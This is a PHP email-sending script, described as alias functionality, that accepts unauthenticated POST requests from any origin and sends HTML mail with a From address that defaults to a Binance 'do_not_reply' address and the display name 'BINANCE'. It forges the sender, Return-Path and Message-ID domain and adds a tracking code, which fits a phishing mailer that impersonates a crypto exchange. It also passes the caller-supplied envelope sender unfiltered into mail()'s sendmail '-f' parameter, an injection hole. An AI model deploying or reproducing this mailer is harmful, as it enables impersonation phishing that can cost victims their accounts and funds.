<?php
// Enhanced PHP email sending script for alias functionality
header('Content-Type: text/plain');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

// Log all requests for debugging
error_log("PHP Email Script: Request received at " . date('Y-m-d H:i:s'));
error_log("PHP Email Script: POST data: " . print_r($_POST, true));

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo "Method not allowed";
    exit;
}

// Get POST parameters
$to = $_POST['to'] ?? '';
$subject = $_POST['subject'] ?? '';
$message = $_POST['message'] ?? '';
$from_email = $_POST['from_email'] ?? 'do_not_reply@mailersp2.binance.com';
$from_name = $_POST['from_name'] ?? 'BINANCE';
$tracking_code = $_POST['tracking_code'] ?? '';
$envelope_from = $_POST['envelope_from'] ?? $from_email;

error_log("PHP Email Script: Parsed - To: $to, From: $from_name <$from_email>, Subject: $subject");

// Validate required fields
if (empty($to) || empty($subject) || empty($message)) {
    http_response_code(400);
    echo "Missing required fields: to=" . (empty($to) ? 'empty' : 'ok') . 
         ", subject=" . (empty($subject) ? 'empty' : 'ok') . 
         ", message=" . (empty($message) ? 'empty' : 'ok');
    exit;
}

// Validate email
if (!filter_var($to, FILTER_VALIDATE_EMAIL)) {
    http_response_code(400);
    echo "Invalid email address: $to";
    exit;
}

// Compute domain from from_email for Message-ID
$from_domain = substr(strrchr($from_email, "@"), 1) ?: 'localhost';

// Set headers for the email
$headers = array(
    'From' => "$from_name <$from_email>",
    'Sender' => $envelope_from,
    'Reply-To' => $from_email,
    'Return-Path' => $envelope_from,
    'MIME-Version' => '1.0',
    'Content-Type' => 'text/html; charset=UTF-8',
    'X-Mailer' => 'PHP/' . phpversion(),
    'X-Tracking-Code' => $tracking_code,
    'Message-ID' => '<' . md5(uniqid((string)mt_rand(), true)) . '@' . $from_domain . '>'
);

// Convert headers array to string
$header_string = '';
foreach ($headers as $key => $value) {
    $header_string .= "$key: $value\r\n";
}

error_log("PHP Email Script: Headers prepared: $header_string");

// Send the email with proper envelope sender for SPF alignment
$params = '-f ' . $envelope_from;
$success = mail($to, $subject, $message, $header_string, $params);

if ($success) {
    $result = "SUCCESS: Email sent from $from_name <$from_email> to $to";
    error_log("PHP Email Script: $result");
    echo $result;
} else {
    $error = "FAILED: Could not send email from $from_name <$from_email> to $to";
    error_log("PHP Email Script: $error");
    http_response_code(500);
    echo $error;
}
?>